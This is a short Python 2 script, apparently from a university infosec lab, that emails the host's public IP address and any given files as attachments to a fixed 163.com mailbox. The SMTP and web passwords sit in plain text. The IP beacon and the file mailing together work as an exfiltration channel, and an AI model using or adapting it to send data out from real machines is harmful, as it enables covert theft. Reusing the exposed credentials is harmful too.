#!/usr/bin/env python
#coding: utf-8

import email
import imaplib
import string
import ast
import os
import json
import random
import smtplib
import ipgetter

from datetime import datetime
from base64 import b64decode
from smtplib import SMTP
from argparse import RawTextHelpFormatter
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from email.header import Header  
from time import gmtime, strftime

sender = 'nkuinfoseclab@163.com'  
receiver = 'nkuinfoseclab@163.com'   
smtpserver = 'smtp.163.com' 
port = 25 
username = 'nkuinfoseclab@163.com'  
password = '2016isnk' 
web_password = "nkis2016"

def send_email(attachment=[]):#发送邮件模块

  sub_header = strftime("%Y-%m-%d %H:%M:%S", gmtime()) 
  msg = MIMEMultipart()#以下是发送带附件邮件，首先构造MIMEMultipart对象做为根容器
  msg['From'] = sub_header
  msg['To'] = username
  msg['Subject'] = sub_header
  msgtext = ipgetter.myip()
  msg.attach(MIMEText(str(msgtext)))# 构造MIMEText对象做为邮件显示内容并附加到根容器
      
  for attach in attachment:
    if os.path.exists(attach) == True:
      part = MIMEBase('application', 'octet-stream') # 构造MIMEText对象做为邮件显示内容并附加到根容器
      part.set_payload(open(attach, 'rb').read()) #读入文件内容
      Encoders.encode_base64(part) #格式化文件内容
      part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))#设置附件头
      msg.attach(part)

  smtp = smtplib.SMTP()  
  smtp.connect(smtpserver, port)  
  smtp.ehlo()  
  smtp.starttls()    
  smtp.set_debuglevel(1)  
  smtp.login(username, password)  
  smtp.sendmail(sender, receiver, msg.as_string())  
  smtp.quit() 

if __name__ == '__main__':
  send_email()
